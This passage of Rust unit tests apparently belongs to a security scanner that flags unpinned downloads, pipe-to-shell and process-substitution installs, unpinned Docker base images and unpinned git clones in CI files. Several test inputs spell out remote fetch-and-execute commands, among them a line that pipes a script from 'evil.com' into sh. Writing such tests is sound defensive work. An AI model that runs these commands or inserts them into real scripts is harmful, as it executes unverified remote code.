        let joined = join_continuations("curl https://x.example/s.sh \\\n  | sh\n");
        assert_eq!(joined.len(), 1);
        assert_eq!(joined[0].0, 0);
        assert_eq!(joined[0].1, "curl https://x.example/s.sh  | sh");
    }

    #[test]
    fn join_continuations_leaves_unbroken_lines_alone() {
        let joined = join_continuations("echo one\necho two\n");
        assert_eq!(joined, vec![(0, "echo one".into()), (1, "echo two".into())]);
    }

    #[test]
    fn join_continuations_handles_multiple_breaks() {
        let joined = join_continuations("curl \\\n  -L \\\n  https://x.example/s.sh | sh\n");
        assert_eq!(joined.len(), 1);
        assert!(joined[0].1.contains("curl"));
        assert!(joined[0].1.contains("| sh"));
    }

    #[test]
    fn shell_scan_catches_pipe_to_shell_across_continuation() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh \\\n  | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_skips_comment_line_with_cargo_install() {
        // A comment documenting what a sed command matches shouldn't fire —
        // the shell never executes comment-line content.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Match `cargo install TOOL --locked`",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_skips_comment_line_with_curl_pipe_to_shell() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "# Example of a bad pattern: curl https://evil.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_unversioned_curl_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_latest_curl_emits_single_high_finding() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_latest_wget_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "wget https://example.com/releases/latest/tool.tar.gz",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_latest_iwr_emits_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            r#"Invoke-WebRequest "https://example.com/releases/latest/tool""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_versioned_curl_is_allowed_in_verbose() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_versioned_curl_drops_allowed_when_not_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/v1.2.3/foo.tar.gz -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn js_scan_versioned_fetch_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/1.2.3/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
    }

    #[test]
    fn js_scan_unversioned_fetch_is_finding() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/api/data");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_versioned_still_high() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/releases/download/v1.2.3/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1, "expected exactly one finding");
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_pipe_to_sh_not_downgraded_by_checksum() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://example.com/install.sh | sh\nsha256sum -c checksums.txt",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(
            !c.findings[0].description.contains("checksum verified"),
            "pipe-shell must not be downgraded by a nearby checksum"
        );
    }

    #[test]
    fn shell_scan_pipe_to_sh_deduplicates_with_latest_pattern() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn shell_scan_proc_sub_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "bash <(curl -L https://example.com/install.sh)",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("process substitution"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_escalates_to_high() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn dockerfile_scan_pipe_shell_across_continuation() {
        // RUN instructions lean on backslash continuations — the fetch and
        // the pipe may sit on different physical lines.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nRUN curl -sSL https://example.com/install.sh \\\n    | sh\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn dockerfile_scan_from_platform_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=linux/amd64 node:latest\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn dockerfile_scan_add_unversioned_url_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("ADD with URL source"));
    }

    #[test]
    fn dockerfile_scan_add_versioned_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/releases/download/v1.2.3/install.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn dockerfile_scan_add_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD https://example.com/config.json /etc/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn dockerfile_scan_add_local_src_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:22.04\nADD ./local.tar.gz /tmp/\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn shell_scan_data_format_url_is_allowed_not_finding() {
        // Real Homebrew/core workflow line — regression anchor.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"DATA_30="$(curl -s https://formulae.brew.sh/api/analytics/install/homebrew-core/30d.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_data_format_url_dropped_without_verbose() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -s https://example.com/config.yaml -o config.yaml",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert!(c.allowed.is_empty());
    }

    #[test]
    fn shell_scan_non_data_url_still_flagged() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn js_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://example.com/config.json");"#,
            "test.js",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn py_scan_data_format_url_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://example.com/data.json")"#,
            "test.py",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_honors_extra_data_formats() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -sSL https://example.com/api.proto -o schema.proto",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_non_configured_extension_still_flagged() {
        let config = Config {
            extra_data_formats: vec!["proto".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -L https://artifacts.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn shell_scan_untrusted_host_still_flagged() {
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://other.example.com/install.sh -o install.sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_latest() {
        // `/latest/` still fires on a trusted host — the risk is about the
        // mutable path, not about who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://artifacts.example.com/releases/latest/install.sh -o foo",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("'latest' URL"));
    }

    #[test]
    fn shell_scan_trusted_host_does_not_exempt_pipe_to_shell() {
        // Pipe-to-shell still fires on a trusted host — payload isn't
        // written to disk regardless of who's serving it.
        let config = Config {
            trusted_hosts: vec!["artifacts.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -sSL https://artifacts.example.com/install.sh | sh",
            "test.sh",
            1,
            "",
            &mut c,
            &config,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert!(c.findings[0].description.contains("piped to shell"));
    }

    #[test]
    fn js_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_js_content(
            r#"const r = await fetch("https://api.example.com/data");"#,
            "test.js",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn gh_release_download_without_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "gh release download -R owner/repo -p '*.tar.gz'",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("gh release download"));
    }

    #[test]
    fn js_minified_line_splitting() {
        let mut c = AuditCollector::new(false);
        // A >500-char minified line with a fetch buried inside.
        let padding = "a".repeat(450);
        let minified = format!(
            r#"{}; const r = await fetch("https://example.com/api/data"); {}"#,
            padding, padding
        );
        scan_js_content(&minified, "dist/index.js", "", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_digest_pinned_skipped() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu@sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn dockerfile_from_latest_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu:latest\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_no_tag_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu\nRUN echo hello\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn dockerfile_from_named_stage_not_flagged() {
        // `FROM builder` references the stage defined above, not an image pull.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nRUN echo build\nFROM builder\nRUN echo package\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_from_scratch_not_flagged() {
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM golang:1.21 AS builder\nFROM scratch\nCOPY --from=builder /app /app\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_stage_alias_collected_with_platform_flag() {
        // The stage is declared with a --platform flag; the later `FROM builder`
        // must still be recognized as a stage reference.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM --platform=$BUILDPLATFORM golang:1.21 AS builder\nFROM builder\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(
            c.findings.is_empty(),
            "findings: {:?}",
            c.findings
                .iter()
                .map(|f| &f.description)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn dockerfile_untagged_base_with_stage_name_still_flagged() {
        // `FROM ubuntu AS builder` pulls untagged ubuntu (implicitly :latest);
        // naming the stage must not suppress the finding on the real base.
        let mut c = AuditCollector::new(false);
        scan_dockerfile_content(
            "FROM ubuntu AS builder\nRUN echo hi\n",
            "Dockerfile",
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert!(c.findings[0].description.contains("FROM without tag"));
    }

    #[test]
    fn scan_action_yml_composite_steps() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_args() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  args: |
    curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_no_runs_key() {
        let yaml: serde_norway::Value = serde_norway::from_str("name: test\n").unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(&yaml, "action.yml", "test-action", &mut c, &DEFAULT_CONFIG);
        assert!(c.findings.is_empty());
    }

    #[test]
    fn downgrade_low_stays_low() {
        assert_eq!(downgrade_severity("low"), "low");
    }

    #[test]
    fn downgrade_unknown_unchanged() {
        assert_eq!(downgrade_severity("info"), "info");
    }

    #[test]
    fn short_sha_full() {
        assert_eq!(
            short_sha("abcdef1234567890abcdef1234567890abcdef12"),
            "abcdef1"
        );
    }

    #[test]
    fn short_sha_short() {
        assert_eq!(short_sha("abc"), "abc");
    }

    // ── vendored-path filtering ────────────────────────────────────────

    #[test]
    fn vendored_path_skips_dependency_dirs() {
        assert!(is_vendored_path("node_modules/lodash/index.js"));
        assert!(is_vendored_path("dist/node_modules/x.js")); // nested
        assert!(is_vendored_path(
            ".venv/lib/python3.12/site-packages/requests/api.py"
        ));
        assert!(is_vendored_path("venv/bin/thing.py"));
        assert!(is_vendored_path("tools/site-packages/pkg.py"));
    }

    #[test]
    fn vendored_path_keeps_action_code() {
        // The action's own bundled/source files must still be scanned.
        assert!(!is_vendored_path("dist/index.js"));
        assert!(!is_vendored_path("src/main.ts"));
        assert!(!is_vendored_path("action.yml"));
        assert!(!is_vendored_path("scripts/setup.py"));
    }

    #[test]
    fn vendored_path_matches_whole_components_only() {
        // Substrings and lookalike names must not be skipped.
        assert!(!is_vendored_path("node_modules_helper.js"));
        assert!(!is_vendored_path("my_vendor/index.js"));
        assert!(!is_vendored_path("src/venvironment.py"));
    }

    // ── select_source_files ────────────────────────────────────────────

    fn tree_entry(path: &str, entry_type: &str) -> crate::github::TreeEntry {
        crate::github::TreeEntry {
            path: path.into(),
            entry_type: entry_type.into(),
        }
    }

    #[test]
    fn select_source_files_classifies_and_filters_in_order() {
        let tree = vec![
            tree_entry("action.yml", "blob"),
            tree_entry("dist/index.js", "blob"), // bundled action code — kept
            tree_entry("src/main.ts", "blob"),
            tree_entry("setup.py", "blob"),
            tree_entry("Dockerfile", "blob"),
            tree_entry("README.md", "blob"), // not scannable
            tree_entry("node_modules/dep/i.js", "blob"), // vendored — skipped
            tree_entry("src", "tree"),       // directory entry — skipped
        ];
        let got = select_source_files(&tree, "");
        assert_eq!(
            got,
            vec![
                ("action.yml".to_string(), SourceFileKind::ActionYml),
                ("dist/index.js".to_string(), SourceFileKind::JavaScript),
                ("src/main.ts".to_string(), SourceFileKind::JavaScript),
                ("setup.py".to_string(), SourceFileKind::Python),
                ("Dockerfile".to_string(), SourceFileKind::Dockerfile),
            ]
        );
    }

    #[test]
    fn select_source_files_scopes_to_subpath_base() {
        let tree = vec![
            tree_entry("action-a/action.yml", "blob"),
            tree_entry("action-a/index.js", "blob"),
            tree_entry("action-b/action.yml", "blob"), // different subpath — excluded
        ];
        let got = select_source_files(&tree, "action-a");
        assert_eq!(
            got,
            vec![
                ("action-a/action.yml".to_string(), SourceFileKind::ActionYml),
                ("action-a/index.js".to_string(), SourceFileKind::JavaScript),
            ]
        );
    }

    #[test]
    fn select_source_files_empty_when_nothing_scannable() {
        let tree = vec![
            tree_entry("README.md", "blob"),
            tree_entry("LICENSE", "blob"),
            tree_entry("node_modules/x/index.js", "blob"),
        ];
        assert!(select_source_files(&tree, "").is_empty());
    }

    #[test]
    fn py_scan_trusted_host_is_allowed() {
        let config = Config {
            trusted_hosts: vec!["api.example.com".to_string()],
            ..Config::default()
        };
        let mut c = AuditCollector::new(true);
        scan_py_content(
            r#"r = requests.get("https://api.example.com/data")"#,
            "test.py",
            "",
            &mut c,
            &config,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "trusted host");
    }

    #[test]
    fn finding_includes_action_name() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/install.sh -o foo",
            "test.sh",
            1,
            "actions/checkout@abc1234",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].action, "actions/checkout@abc1234");
    }

    #[test]
    fn checksum_at_boundary_of_three_lines() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\necho step1\necho step2\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("checksum verified"));
    }

    #[test]
    fn checksum_beyond_three_lines_no_downgrade() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L https://example.com/releases/latest/download/tool -o tool\necho 1\necho 2\necho 3\nsha256sum --check tool.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    // ── git clone ─────────────────────────────────────────────────────

    #[test]
    fn git_clone_unpinned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("git clone"));
    }

    #[test]
    fn git_clone_versioned_branch_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_main_branch_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --branch main https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_depth_one_versioned_clean() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone --depth 1 --branch v1.2.3 https://github.com/org/repo",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn git_clone_followed_by_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo\ncd repo\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn git_clone_sha_checkout_beyond_three_lines_still_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "git clone https://github.com/org/repo\necho 1\necho 2\necho 3\ngit checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn git_clone_same_line_sha_checkout_is_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "git clone https://github.com/org/repo && cd repo && git checkout abcdef1234567890abcdef1234567890abcdef12",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "followed by SHA checkout");
    }

    #[test]
    fn shell_scan_catches_fetch_split_across_continuation() {
        // A two-part pattern (command + URL) split across a backslash
        // continuation is one shell command and must be seen whole.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -L \\\n  https://example.com/install.sh -o install.sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert_eq!(c.findings[0].line, Some(1));
    }

    #[test]
    fn shell_scan_pipe_through_intermediate_stage_single_high_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -fsSL https://example.com/install.sh | tr -d '\\r' | bash",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_comment_backslash_does_not_hide_next_line() {
        // A trailing backslash on a comment is comment text — the next line
        // is a new command and must still be scanned.
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "# see docs \\\ncurl https://example.com/install.sh | sh\n",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
        assert_eq!(c.findings[0].line, Some(2));
    }

    #[test]
    fn shell_scan_same_line_checksum_downgrades() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -o tool.tgz https://example.com/tool.tgz && sha256sum -c tool.tgz.sha256",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "low");
        assert!(c.findings[0].description.contains("checksum verified"));
    }

    #[test]
    fn shell_scan_script_arg_cmd_sub_not_a_pipe_finding() {
        // Fetched bytes passed as a script argument are not executed — this
        // used to fire the high-severity command-substitution rule via the
        // `sh` in the filename. The data-format URL keeps the unversioned
        // rule quiet too, so the line is fully clean.
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            r#"./notify.sh "$(curl -s https://api.example.com/status.json)""#,
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "data format URL");
    }

    #[test]
    fn shell_scan_versioned_url_at_end_of_line_allowed() {
        let mut c = AuditCollector::new(true);
        scan_shell_content(
            "curl -LO https://example.com/download/v1.2.3",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert!(c.findings.is_empty());
        assert_eq!(c.allowed.len(), 1);
        assert_eq!(c.allowed[0].reason, "versioned URL");
    }

    #[test]
    fn shell_scan_curl_latest_at_end_of_line_is_high() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "curl -LO https://example.com/releases/latest",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn shell_scan_npx_unversioned_is_finding() {
        let mut c = AuditCollector::new(false);
        scan_shell_content(
            "npx create-react-app my-app",
            "test.sh",
            1,
            "",
            &mut c,
            &DEFAULT_CONFIG,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "medium");
        assert!(c.findings[0].description.contains("npx"));
    }

    #[test]
    fn shell_scan_npx_version_pinned_clean() {
